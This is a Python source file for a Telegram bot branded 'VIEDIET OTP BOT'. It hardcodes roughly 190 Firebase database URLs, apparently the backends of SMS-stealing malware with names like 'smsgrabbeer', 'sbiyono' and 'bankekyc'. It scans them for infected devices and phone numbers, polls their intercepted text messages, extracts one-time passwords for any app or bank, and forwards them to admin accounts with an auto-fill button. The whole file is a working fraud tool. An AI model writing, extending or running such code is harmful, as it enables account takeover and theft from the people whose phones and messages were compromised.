# -*- coding: utf-8 -*-
"""
🥷 VIEDIET OTP BOT — Full OTP Panel Bot
Made by @viediet

Logic taken from refer.py (panel discovery + SMS polling from Firebase),
rebuilt as an interactive Telegram panel bot:

  * Branded alerts (VIEDIET OTP BOT) for ANY app/website OTP
  * Select any panel -> device -> number and monitor it live
  * /all  -> auto-monitor every online device in every Firebase panel
  * Auto-Fill button -> injects the OTP straight into your chat input box
  * Mark Used / Stop monitor / Status / per-user admin access

Requires:  pip install python-telegram-bot requests aiohttp
"""

import asyncio
import base64
import html
import json
import logging
import os
import random
import re
import socket
import sys
import threading
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import aiohttp
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, MessageHandler, filters,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("viediet_otp_bot")

# ═══════════════════════════════════════════════════════════════
# CONFIG — YAHA SE EDIT KARO
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")   # ← BotFather ka naya token (Railway me env se bhi aa sakta)

# Sirf ye user IDs bot use kar sakte hain (apna Telegram ID daalo)
ADMIN_IDS = [1364476174,8455570642]

BRAND = "🥷 VIEDIET OTP BOT"
BRAND_FOOT = "━━━━━━━━━━━━━━━━\n© VIEDIET OTP BOT"

POLL_INTERVAL = 3.0      # seconds between SMS polls per device
DISCOVERY_TIMEOUT = 8    # per-panel discovery timeout (sec)
ALERT_WINDOW = 300       # sirf itne seconds ke andar ke OTP alert karo (5 min)
SEEN_CACHE_FILE = Path(os.environ.get("VIEDIET_DATA_DIR", Path(__file__).parent)) / "viediet_otp_seen.json"
SETTINGS_FILE = Path(os.environ.get("VIEDIET_DATA_DIR", Path(__file__).parent)) / "viediet_settings.json"
DEFAULT_SETTINGS = {
    "force_join": {"enabled": False, "channels": []},
    "monitor_interval": 1.0,
    "user_databases": {},   # tag -> {"url":..., "added_by":..., "ts":...}
    "users": {},            # str(user_id) -> {"access_until": ts, "referred": [ids]}
    "assignments": {},      # str(user_id) -> {"idx": int, "num": str, "ts": ts}
}
settings: dict = dict(DEFAULT_SETTINGS)

# SMS nodes jo panels me check honge (per device)
SMS_PATHS = ["All_Users/sms/{dev}", "user_sms/{dev}", "sms/{dev}"]

# ═══════════════════════════════════════════════════════════════
# ALL FIREBASE PANELS — refer.py se (FULL LIST)
# ═══════════════════════════════════════════════════════════════

DATABASES: Dict[str, str] = {
    "hdjdjdj": "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
    "muajob": "https://muajob-29c86-default-rtdb.firebaseio.com",
    "rahulgandhi": "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "dark": "https://dark-274b4-default-rtdb.firebaseio.com",
    "dyydd": "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "gjhghjj": "https://gjhghjj-3d251-default-rtdb.firebaseio.com",
    "rameshwar": "https://rameshwar-7okt-default-rtdb.firebaseio.com",
    "rahulcscperosnl": "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "businessapps": "https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com",
    "dhani": "https://dhani-aa151-default-rtdb.firebaseio.com",
    "imdum": "https://imdum-6e873-default-rtdb.firebaseio.com",
    "goone": "https://go-one-1b6b2-default-rtdb.firebaseio.com",
    "server97": "https://server-97e23-default-rtdb.firebaseio.com",
    "server2": "https://server-2-fb768-default-rtdb.firebaseio.com",
    "indus": "https://indus-1-cec4f-default-rtdb.firebaseio.com",
    "ufff": "https://ufff-52c18-default-rtdb.firebaseio.com",
    "rajkumar": "https://raj-kumar-63492-default-rtdb.firebaseio.com",
    "aaaa": "https://aaaa-b3749-default-rtdb.firebaseio.com",
    "pmfg": "https://pmfg-ccccc-default-rtdb.firebaseio.com",
    "ckkumar": "https://ck-kumar3-default-rtdb.firebaseio.com",
    "boi3": "https://boi-3-8914d-default-rtdb.firebaseio.com",
    "testing848": "https://testing-848ad-default-rtdb.firebaseio.com",
    "hdhdhdh": "https://hdhdhdh-38ae0-default-rtdb.firebaseio.com",
    "kumarlive": "https://kumarlive1-default-rtdb.firebaseio.com",
    "myapp": "https://myapp-8228a-default-rtdb.firebaseio.com",
    "fir1": "https://fir-1fa16-default-rtdb.firebaseio.com",
    "project3": "https://project3-13fff-default-rtdb.firebaseio.com",
    "duuu": "https://duuu-dc41d-default-rtdb.firebaseio.com",
    "newspreding": "https://newspreding-default-rtdb.firebaseio.com",
    "totla": "https://totla-panel-default-rtdb.firebaseio.com",
    "rt51": "https://rt51-6e1df-default-rtdb.firebaseio.com",
    "airto": "https://ai-rto-9-default-rtdb.firebaseio.com",
    "apkdriod": "https://apkdriod-default-rtdb.firebaseio.com",
    "fir408": "https://fir-408f9-default-rtdb.firebaseio.com",
    "runjun": "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "chfjfj": "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "sep12": "https://sep12-aea6d-default-rtdb.firebaseio.com",
    "fires": "https://fires-847da-default-rtdb.firebaseio.com",
    "spy25": "https://spy-25-default-rtdb.firebaseio.com",
    "gggggg": "https://gggggg-979bd-default-rtdb.firebaseio.com",
    "sirelech": "https://sirelech1-default-rtdb.firebaseio.com",
    "tillu2": "https://tillu-2-default-rtdb.firebaseio.com",
    "rto": "https://rto-44-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rtx": "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app",
    "sb-rex": "https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app",
    "smsgrabbeer": "https://smsgrabbeer-default-rtdb.asia-southeast1.firebasedatabase.app",
    "yourfirebasio": "https://yourfirebasio-default-rtdb.asia-southeast1.firebasedatabase.app",
    "e5turnament2": "https://e5turnament2-default-rtdb.firebaseio.com",
    "lovefimus":    "https://lovefimus-default-rtdb.firebaseio.com",
    "challan":      "https://challan-758d1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "damonps2":     "https://damonps2-pro.firebaseio.com",
    "mmmm":         "https://mmmm-f7678-default-rtdb.firebaseio.com",
    "panelwala70":  "https://panel-wala-v70-default-rtdb.firebaseio.com",
    "kisi":         "https://kisi-d6da8-default-rtdb.firebaseio.com",
    "rbl7":         "https://rbl-7-e796b-default-rtdb.firebaseio.com",
    "jamtara181":   "https://jamtara181-default-rtdb.firebaseio.com",
    "panelwala64":  "https://panel-wala-v64-default-rtdb.firebaseio.com",
    "mano99":       "https://mano99-default-rtdb.firebaseio.com",
    "please":       "https://please-2b091-default-rtdb.firebaseio.com",
    "vibe":         "https://vibe-d238e-default-rtdb.firebaseio.com",
    "pmkisan":      "https://pm-kisan-01hfg-default-rtdb.firebaseio.com",
    "hehe":         "https://hehe-679dd-default-rtdb.firebaseio.com",
    "smsmms":       "https://smsmms-3b08e-default-rtdb.firebaseio.com",
    "pintu":        "https://pintu-8921f-default-rtdb.firebaseio.com",
    "shootadminkitter": "https://shooot-admin-kitter-default-rtdb.firebaseio.com",
    "tryagainnew":  "https://tryagainnew-58f1a-default-rtdb.firebaseio.com",
    "rantaishita":  "https://rantaishita-f7614-default-rtdb.firebaseio.com",
    "smas":         "https://smas-8bff8-default-rtdb.firebaseio.com",
    "asdtest":      "https://asdtest-project-default-rtdb.firebaseio.com",
    "access20":     "https://access20-3fc38-default-rtdb.firebaseio.com",
    "virugoniya":   "https://virugoniya-default-rtdb.firebaseio.com",
    "vdgdgd":       "https://vdgdgd-80f1e-default-rtdb.firebaseio.com",
    "piryankakumari": "https://piryankakumari1212c-9f29e-default-rtdb.firebaseio.com",
    "panelwala16":  "https://panel-wala-v16-default-rtdb.firebaseio.com",
    "jayma":        "https://jayma-9ce22-default-rtdb.firebaseio.com",
    "annapunna":    "https://annapunna-12b79-default-rtdb.firebaseio.com",
    "newappi":      "https://newappi-7661a-default-rtdb.firebaseio.com",
    "dwala":        "https://dwala-3d1ff-default-rtdb.firebaseio.com",
    "pinkyrani":    "https://pinkyrani-default-rtdb.firebaseio.com",
    "komaljah":     "https://komaljah-default-rtdb.firebaseio.com",
    "binacallwalahe": "https://binacallwalahe-default-rtdb.asia-southeast1.firebasedatabase.app",
    "sbiyono":      "https://sbi-yono-i31an-default-rtdb.firebaseio.com",
    "yes2":         "https://yes2-ead3d-default-rtdb.firebaseio.com",
    "navin512":     "https://navin512-54d6f-default-rtdb.firebaseio.com",
    "rtoechall":    "https://rto-e-chall-4-default-rtdb.firebaseio.com",
    "dyno":         "https://dyno-1b564-default-rtdb.firebaseio.com",
    "painislv":        "https://painislv-default-rtdb.firebaseio.com",
    "panel-v11":       "https://panel-wala-v11-default-rtdb.firebaseio.com",
    "panel123628":     "https://panel123628-default-rtdb.firebaseio.com",
    "pawankumar":      "https://pawankumar92342038-8f702-default-rtdb.firebaseio.com",
    "pehla-green":     "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "pk114":           "https://pk114-6e828-default-rtdb.firebaseio.com",
    "pm-kisan-20":     "https://pm-kisan-20-vgg-default-rtdb.firebaseio.com",
    "pm-kisan-28":     "https://pm-kisan-28ugg-default-rtdb.firebaseio.com",
    "pmnr1newad":      "https://pmnr1newad-default-rtdb.firebaseio.com",
    "pmsjdj":          "https://pmsjdj-default-rtdb.firebaseio.com",
    "pohn":            "https://pohn-cd7ea-default-rtdb.firebaseio.com",
    "pp30":            "https://pp30-fc7e5-default-rtdb.firebaseio.com",
    "prof":            "https://prof-b6a64-default-rtdb.firebaseio.com",
    "projectsb0810":   "https://projectsb0810-default-rtdb.firebaseio.com",
    "pvn7":            "https://pvn7-a873a-default-rtdb.firebaseio.com",
    "r62710898":       "https://r62710898-39a8e-default-rtdb.firebaseio.com",
    "rahu80759":       "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
    "rahul-54fe9":     "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "rahul-6bf55":     "https://rahul-6bf55-default-rtdb.firebaseio.com",
    "raj254346":       "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
    "raja252525":      "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com",
    "rajkumar8822556644": "https://rajkumar8822556644-407f5-default-rtdb.firebaseio.com",
    "rajputchuttad":   "https://rajputchuttad-default-rtdb.firebaseio.com",
    "raki143aa":       "https://raki143aa-default-rtdb.firebaseio.com",
    "randi-rona":      "https://randi-rona-81876-default-rtdb.firebaseio.com",
    "ruff":           "https://ruff-panel-default-rtdb.firebaseio.com",
    "dogla":          "https://dogla-de225-default-rtdb.firebaseio.com",
    "gren":           "https://gren-ff2af-default-rtdb.firebaseio.com",
    "loda":           "https://loda-5029e-default-rtdb.firebaseio.com",
    "mpari":          "https://mpari-6a6e5-default-rtdb.firebaseio.com",
    "comeback":       "https://comeback-5b876-default-rtdb.firebaseio.com",
    "strom":          "https://strom-90e84-default-rtdb.firebaseio.com",
    "singhaana":      "https://singhaana-6f199-default-rtdb.firebaseio.com",
    "flash":          "https://flash-v7powerengine-v7-default-rtdb.firebaseio.com",
    "money":          "https://money-ace2c-default-rtdb.firebaseio.com",
    "vecna":          "https://vecna-82db2-default-rtdb.firebaseio.com",
    "dadddy":         "https://dadddy-ec5fa-default-rtdb.asia-southeast1.firebasedatabase.app",
    "nyawala":        "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
    "kashish":        "https://kashish-700f7-default-rtdb.asia-southeast1.firebasedatabase.app",
    "ridam":          "https://ridam-c7949-default-rtdb.asia-southeast1.firebasedatabase.app",
    "hackboss":       "https://hack-boss-9de0f-default-rtdb.asia-southeast1.firebasedatabase.app",
    "anand":          "https://anand-d7e61-default-rtdb.asia-southeast1.firebasedatabase.app",
    "farhan":         "https://farhan-565bc-default-rtdb.asia-southeast1.firebasedatabase.app",
    "jonny":          "https://jonny-9bb2a-default-rtdb.europe-west1.firebasedatabase.app",
    "proooh":         "https://proooh-672e6-default-rtdb.asia-southeast1.firebasedatabase.app",
    "apna26":         "https://apna26-default-rtdb.asia-southeast1.firebasedatabase.app",
    "jamtara74":      "https://jamtara74-c231e-default-rtdb.firebaseio.com",
    "salasali":       "https://salasali6990-1171d-default-rtdb.firebaseio.com",
    "samar95476":     "https://samar95476-54eb9-default-rtdb.firebaseio.com",
    "samar84900":     "https://samar84900-6f084-default-rtdb.firebaseio.com",
    "rto9":           "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "trying":         "https://trying-90b4b-default-rtdb.firebaseio.com",
    "newgodx":        "https://newgodx-5b008-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rto63":          "https://rto-63-default-rtdb.asia-southeast1.firebasedatabase.app",
    "sssssmmmmsw":    "https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app",
    "bossuun":        "https://bossuun-default-rtdb.firebaseio.com",
    "rto91":          "https://rto91-2b27f-default-rtdb.firebaseio.com",
    "rexxx":          "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "server14":       "https://server14-c6551-default-rtdb.firebaseio.com",
    "panelwala1":     "https://panel-wala-v1-default-rtdb.asia-southeast1.firebasedatabase.app",
    "rto47":          "https://rto-47-b39f4-default-rtdb.firebaseio.com",
    "rc39":           "https://rc-39-15-default-rtdb.firebaseio.com",
    "yourfirebase":   "https://yourfirebase-default-rtdb.firebaseio.com",
    "server2a":       "https://server-2-a095f-default-rtdb.firebaseio.com",
    "server1c":       "https://server-1-c3501-default-rtdb.firebaseio.com",
    "ruhr":           "https://ruhr-4da8f-default-rtdb.firebaseio.com",
    "activity":       "https://activity-e16b3-default-rtdb.firebaseio.com",
    "app2":           "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "bankekyc":       "https://bank-e-kyc-default-rtdb.firebaseio.com",
    "challan5":       "https://challan5-default-rtdb.firebaseio.com",
    "csforme":        "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "demon4":         "https://demon-4-default-rtdb.firebaseio.com",
    "fire8ad7":       "https://fir-e8ad7-default-rtdb.firebaseio.com",
    "gaandkiaand":    "https://gaandkiaand-default-rtdb.firebaseio.com",
    "hopkhfg":        "https://hopkhfg-9981a-default-rtdb.firebaseio.com",
    "jamtara118":     "https://jamtara118-7cd20-default-rtdb.firebaseio.com",
    "jamtara150":     "https://jamtara150-62b22-default-rtdb.firebaseio.com",
    "maik31440":      "https://maik-31440-default-rtdb.firebaseio.com",
    "manuwa":         "https://manuwa-bb70a-default-rtdb.firebaseio.com",
    "mayor":          "https://mayor-6f08c-default-rtdb.firebaseio.com",
    "merawala":       "https://mera-wala-71a5e-default-rtdb.firebaseio.com",
    "myabtar":        "https://myabtar-default-rtdb.firebaseio.com",
    "risho":          "https://risho-d4c66-default-rtdb.firebaseio.com",
    "s85138920":      "https://s85138920-87594-default-rtdb.firebaseio.com",
    "shhs":           "https://shhs-8fe30-default-rtdb.firebaseio.com",
    "u40179853":      "https://u40179853-987df-default-rtdb.firebaseio.com",
    "u67583339":      "https://u67583339-bf0c1-default-rtdb.firebaseio.com",
    "xc04":           "https://xc04-52348-default-rtdb.firebaseio.com",
    "yqhwy":          "https://yqhwy-2fb47-default-rtdb.firebaseio.com",
    "dark18907":      "https://dark-18907-default-rtdb.asia-southeast1.firebasedatabase.app",
    "sbiclient0":     "https://sbiclient0-default-rtdb.asia-southeast1.firebasedatabase.app",
}

# ═══════════════════════════════════════════════════════════════
# RUNTIME STATE
# ═══════════════════════════════════════════════════════════════

app_ref: Optional[Application] = None
bot_loop: Optional[asyncio.AbstractEventLoop] = None
state_lock = threading.Lock()

monitors: Dict[str, dict] = {}      # dev_key -> monitor entry
monitor_mid: Dict[int, str] = {}    # mid -> dev_key (short callback token)
_next_mid = [1]
sms_id_map: Dict[int, str] = {}     # sid -> sms_key (short callback token)
_next_sid = [1]
num_list: List[dict] = []           # flat number list from last discovery
discovered_panels: List[dict] = []  # last discovery result
sms_sent: Dict[str, dict] = {}      # sms_key -> {chat_id, message_id} (for Mark Used)
seen_keys: set = set()              # sms keys already processed

_aio_session: Optional[aiohttp.ClientSession] = None

PAGE_SIZE = 50


def load_seen_cache():
    global seen_keys
    try:
        if SEEN_CACHE_FILE.exists():
            data = json.loads(SEEN_CACHE_FILE.read_text(encoding="utf-8"))
            seen_keys = set(data.get("seen", []))[-5000:]
    except Exception:
        seen_keys = set()


def save_seen_cache():
    try:
        SEEN_CACHE_FILE.write_text(
            json.dumps({"seen": list(seen_keys)[-5000:]}), encoding="utf-8")
    except Exception:
        pass


def load_settings():
    global settings
    try:
        if SETTINGS_FILE.exists():
            data = json.loads(SETTINGS_FILE.read_text(encoding="utf-8"))
            for k, v in DEFAULT_SETTINGS.items():
                if k not in data:
                    data[k] = v
            settings = data
    except Exception:
        settings = dict(DEFAULT_SETTINGS)


def save_settings():
    try:
        SETTINGS_FILE.write_text(json.dumps(settings, indent=2), encoding="utf-8")
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# PANEL DISCOVERY (refer.py logic, async)
# ═══════════════════════════════════════════════════════════════

async def get_aio_session() -> aiohttp.ClientSession:
    global _aio_session
    if _aio_session is None or _aio_session.closed:
        connector = aiohttp.TCPConnector(limit=300, ttl_dns_cache=300)
        _aio_session = aiohttp.ClientSession(connector=connector)
    return _aio_session


async def aio_fb_get(path: str, base: str, shallow: bool = False) -> Optional[dict]:
    try:
        session = await get_aio_session()
        suffix = ".json?shallow=true" if shallow else ".json"
        url = f"{base}/{path}{suffix}"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=DISCOVERY_TIMEOUT)) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None


def extract_all_nums(*dicts) -> List[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
                     "mobNo", "phoneNumber", "phone", "mobile"]
    for d in dicts:
        if not isinstance(d, dict):
            continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) >= 10:
                clean = re.sub(r"\D", "", val)
                nums.append(clean[-10:])
    return list(set(nums))


async def check_panel_active(tag: str, url: str) -> Optional[dict]:
    try:
        sim_all, device_info_all, sms_keys, user_sms_keys = await asyncio.gather(
            aio_fb_get("All_Users/simDetails", url),
            aio_fb_get("All_Users/Data/DeviceInfo", url),
            aio_fb_get("All_Users/sms", url, shallow=True),
            aio_fb_get("user_sms", url, shallow=True),
            return_exceptions=True
        )

        # ── Method 1 (refer.py): simDetails + DeviceInfo ────────────────
        if isinstance(sim_all, dict) and sim_all:
            info_all = device_info_all if isinstance(device_info_all, dict) else {}
            devices = []
            for dev_id, sim in sim_all.items():
                info = info_all.get(dev_id) or {}
                status = str(info.get("Status", "")).lower()
                nums = extract_all_nums(sim, info)
                if not nums:
                    continue
                devices.append({
                    "id": dev_id,
                    "numbers": nums,
                    "status": "online" if status == "online" else "offline",
                })
            if devices:
                online = [d for d in devices if d["status"] == "online"]
                offline = [d for d in devices if d["status"] != "online"]
                return {
                    "tag": tag, "url": url,
                    "devices": devices,
                    "online_devices": online,
                    "offline_devices": offline,
                    "total_devices": len(devices),
                    "total_numbers": sum(len(d["numbers"]) for d in devices),
                    "online_numbers": sum(len(d["numbers"]) for d in online),
                    "offline_numbers": sum(len(d["numbers"]) for d in offline),
                    "method": "simDetails",
                }

        # ── Method 2 (fallback): All_Users/sms node hi device list hai ──
        sms_node = None
        sms_prefix = None
        if isinstance(sms_keys, dict) and sms_keys:
            sms_node, sms_prefix = sms_keys, "All_Users/sms"
        elif isinstance(user_sms_keys, dict) and user_sms_keys:
            sms_node, sms_prefix = user_sms_keys, "user_sms"
        if sms_node:
            dev_ids = list(sms_node.keys())[:8]
            sample_nums = []
            first_dev_sms = await aio_fb_get(f"{sms_prefix}/{dev_ids[0]}", url)
            if isinstance(first_dev_sms, dict):
                sample_nums = extract_nums_from_sms(first_dev_sms)
            devices = []
            for dev_id in dev_ids:
                devices.append({"id": dev_id, "numbers": list(sample_nums), "status": "online"})
            total_nums = sum(len(d["numbers"]) for d in devices)
            return {
                "tag": tag, "url": url,
                "devices": devices,
                "online_devices": list(devices),
                "offline_devices": [],
                "total_devices": len(devices),
                "total_numbers": total_nums,
                "online_numbers": total_nums,
                "offline_numbers": 0,
                "method": "sms",
            }
        return None
    except Exception:
        return None


def extract_nums_from_sms(dev_sms: dict) -> List[str]:
    nums = []
    for k, v in list(dev_sms.items())[:10]:
        if not isinstance(v, dict):
            continue
        sender = str(v.get("sender") or v.get("from") or v.get("address") or "")
        m = re.search(r"\d{10,12}", sender)
        if m:
            nums.append(m.group(0)[-10:])
    return list(set(nums))[:3]


async def discover_active_panels() -> List[dict]:
    tasks = [check_panel_active(tag, url) for tag, url in all_databases().items()]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    active = []
    for res in results:
        if isinstance(res, dict) and res:
            active.append(res)
    active.sort(key=lambda p: p["total_numbers"], reverse=True)
    return active


# ═══════════════════════════════════════════════════════════════
# OTP EXTRACTION — kisi bhi app / website ke SMS se
# ═══════════════════════════════════════════════════════════════

OTP_KEYWORDS = [
    "otp", "one time password", "onetime password", "one-time password",
    "verification code", "verify code", "verification otp", "login code",
    "authentication code", "security code", "register code", "registration code",
    "activation code", "reset code", "account code", "confirm code",
    "use code", "your code", "is your otp", "your otp",
]

OTP_RE = re.compile(
    r"(?:otp|one[ -]?time password|verification code|verification otp|"
    r"verify(?:cation)? code|login code|authentication code|security code|"
    r"register(?:ation)? code|activation code|reset code|confirm code|"
    r"your code|account code)[\s:.\-()]*?(?:is|are|was|:)?[\s:.\-()]*?([0-9]{4,8})",
    re.IGNORECASE,
)

OTP_AFTER_RE = re.compile(
    r"\b([0-9]{4,8})\b[\s:.\-()]*(?:is|was|are)?[\s:.\-()]*(?:your|the)?[\s:.\-()]*"
    r"(?:otp|verification code|one[ -]?time password|login code|security code|code)",
    re.IGNORECASE,
)

DIGIT_ONLY_RE = re.compile(r"\b([0-9]{4,8})\b")


def extract_otp(body: str) -> Optional[str]:
    if not body:
        return None
    m = OTP_RE.search(body)
    if m:
        return m.group(1)
    m = OTP_AFTER_RE.search(body)
    if m:
        return m.group(1)
    low = body.lower()
    if any(k in low for k in OTP_KEYWORDS):
        m = DIGIT_ONLY_RE.search(body)
        if m:
            return m.group(1)
    m = DIGIT_ONLY_RE.search(body)
    if m and len(m.group(1)) == 6:
        return m.group(1)
    return None


def flatten_sms(value, depth=0) -> List[dict]:
    """Panels alag-alag SMS structure store karte hain — sab handle karo."""
    out = []
    if depth > 4 or value is None:
        return out
    if isinstance(value, dict):
        body = (value.get("body") or value.get("message") or value.get("text")
                or value.get("Body") or value.get("Message") or value.get("smsBody"))
        sender = (value.get("from") or value.get("from_number") or value.get("sender")
                  or value.get("address") or value.get("phone") or value.get("num"))
        if body is not None:
            out.append({"body": str(body), "sender": str(sender or "")})
        else:
            for v in value.values():
                out.extend(flatten_sms(v, depth + 1))
    elif isinstance(value, list):
        for v in value:
            out.extend(flatten_sms(v, depth + 1))
    return out


# ═══════════════════════════════════════════════════════════════
# MONITOR LOOP — background thread (refer.py polling logic)
# ═══════════════════════════════════════════════════════════════

def dev_key(panel_url: str, device_id: str) -> str:
    return f"{panel_url}|{device_id}"


def start_monitor(panel: dict, device: dict, owner_id: Optional[int] = None) -> bool:
    key = dev_key(panel["url"], device["id"])
    with state_lock:
        if key in monitors:
            return False
        mid = _next_mid[0]
        _next_mid[0] += 1
        monitors[key] = {
            "mid": mid,
            "panel_url": panel["url"],
            "panel_tag": panel["tag"],
            "device_id": device["id"],
            "numbers": device["numbers"],
            "owner_id": owner_id,
            "started": time.time(),
            "otps": 0,
            "baseline_done": False,
            "last_poll": 0.0,
        }
        monitor_mid[mid] = key
    return True


def stop_monitor(key: str) -> bool:
    with state_lock:
        m = monitors.pop(key, None)
        if m is None:
            return False
        monitor_mid.pop(m["mid"], None)
    return True


def stop_all_monitors() -> int:
    with state_lock:
        n = len(monitors)
        monitors.clear()
    return n


def _mark_seen(key: str):
    seen_keys.add(key)
    if len(seen_keys) % 20 == 0:
        save_seen_cache()


def _fetch_sms(panel_url: str, device_id: str) -> dict:
    for path_tpl in SMS_PATHS:
        path = path_tpl.format(dev=device_id)
        try:
            r = requests.get(f"{panel_url}/{path}.json", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and data:
                    return data
        except Exception:
            continue
    return {}


async def _send_alert_async(panel_url: str, panel_tag: str, device_id: str,
                            numbers: List[str], sms_key: str, sms_body: str,
                            sender: str, otp: str) -> bool:
    num = html.escape(", ".join(numbers) if numbers else "-")
    sender_line = f"📲 Sender: <code>{html.escape(sender)}</code>\n" if sender else ""
    now = datetime.now().strftime("%d %b %Y, %H:%M:%S")
    with state_lock:
        sid = _next_sid[0]
        _next_sid[0] += 1
        sms_id_map[sid] = sms_key
    m = monitors.get(dev_key(panel_url, device_id)) or {}
    mid = m.get("mid")
    keyboard_rows = [
        [
            B("🔁 Auto-Fill", switch=otp, style="success", icon=ICON_GREEN),
            B("✅ Mark Used", f"used|{sid}", style="primary", icon=ICON_BLUE),
        ],
    ]
    if mid:
        keyboard_rows.append([B("⏹ Stop Monitor", f"stop|{mid}", style="danger", icon=ICON_RED)])
    text = (
        f"🥷 <b>VIEDIET OTP BOT</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>OTP:</b> <code>{otp}</code>\n"
        f"📱 Number: <code>{num}</code>\n"
        f"🆔 Device: <code>{html.escape(device_id[:20])}</code>\n"
        f"{sender_line}"
        f"⏰ {now}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"💬 {html.escape(sms_body[:180])}"
    )
    delivered = False
    recipients = [m.get("owner_id")] if m.get("owner_id") else []
    recipients = list(dict.fromkeys([r for r in recipients + ADMIN_IDS if r]))
    for admin_id in recipients:
        try:
            msg_id = _send_rows(admin_id, text, keyboard_rows)
            if msg_id:
                sms_sent[sms_key] = {"chat_id": admin_id, "message_id": msg_id}
                delivered = True
            else:
                msg = await app_ref.bot.send_message(
                    admin_id, text, parse_mode=ParseMode.HTML,
                    reply_markup=_rows_to_markup(keyboard_rows),
                    disable_web_page_preview=True)
                sms_sent[sms_key] = {"chat_id": admin_id, "message_id": msg.message_id}
                delivered = True
        except Exception as e:
            log.warning("Alert send failed for %s: %s", admin_id, e)
    if delivered:
        log.info("OTP %s -> %s (%s)", otp, num, panel_tag)
    return delivered


def _send_alert(panel_url: str, panel_tag: str, device_id: str, numbers: List[str],
                sms_key: str, sms_body: str, sender: str, otp: str) -> bool:
    try:
        fut = asyncio.run_coroutine_threadsafe(
            _send_alert_async(panel_url, panel_tag, device_id, numbers,
                              sms_key, sms_body, sender, otp),
            bot_loop)
        return fut.result(timeout=25)
    except Exception as e:
        log.warning("Alert send failed: %s", e)
        return False


def _sms_age_seconds(sms_value) -> Optional[float]:
    if not isinstance(sms_value, dict):
        return None
    ts = (sms_value.get("timestamp") or sms_value.get("time")
          or sms_value.get("date") or sms_value.get("ms"))
    if ts is None:
        return None
    try:
        ts = float(ts)
        if ts > 1e12:
            ts /= 1000.0
        return time.time() - ts
    except (TypeError, ValueError):
        return None


def monitor_loop():
    log.info("Monitor loop started (poll interval %.1fs)", POLL_INTERVAL)
    while True:
        interval = float(settings.get("monitor_interval", 1.0))
        with state_lock:
            items = list(monitors.items())
        now = time.time()
        for key, m in items:
            # per-device interval (default 1s) — har device apne timing se
            if now - (m.get("last_poll") or 0) < interval:
                continue
            with state_lock:
                if key in monitors:
                    monitors[key]["last_poll"] = now
            # ── Baseline pehle poll pe hi khatam karo, chahe sms khaali ho.
            #    Agar yahan nahi kiya toh pehla naya OTP "old" samajh ke
            #    skip ho jayega ── isi liye OTP telegram pe nahi aa raha tha ──
            if not m.get("baseline_done"):
                try:
                    base = _fetch_sms(m["panel_url"], m["device_id"])
                    for sms_key in (base or {}).keys():
                        _mark_seen(f"{key}|{sms_key}")
                except Exception:
                    pass
                with state_lock:
                    if key in monitors:
                        monitors[key]["baseline_done"] = True
                continue

            try:
                sms_data = _fetch_sms(m["panel_url"], m["device_id"])
            except Exception:
                continue
            if not sms_data:
                continue

            for sms_key, sms_value in sms_data.items():
                cache_key = f"{key}|{sms_key}"
                if cache_key in seen_keys:
                    continue

                # 5-min window: purana sms (timestamp ke hisaab se) skip
                age = _sms_age_seconds(sms_value)
                if age is not None and age > ALERT_WINDOW:
                    _mark_seen(cache_key)
                    continue

                # Pehle alert bhejo, TABHI seen mark karo —
                # agar send fail hua toh agle poll pe retry hoga
                alerted = False
                for parsed in flatten_sms(sms_value):
                    otp = extract_otp(parsed["body"])
                    if otp:
                        if _send_alert(m["panel_url"], m["panel_tag"], m["device_id"],
                                       m["numbers"], cache_key, parsed["body"],
                                       parsed["sender"], otp):
                            alerted = True
                if alerted:
                    _mark_seen(cache_key)
                    with state_lock:
                        if key in monitors:
                            monitors[key]["otps"] += 1
        time.sleep(0.4)


# ═══════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ═══════════════════════════════════════════════════════════════

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


ICON_BLUE = "5373141891321699086"
ICON_RED = "5370810157871667232"
ICON_GREEN = "5471984997361523302"


def B(text: str, cb: str = None, url: str = None, switch: str = None,
      style: str = None, icon: str = None) -> dict:
    b = {"text": text}
    if cb:
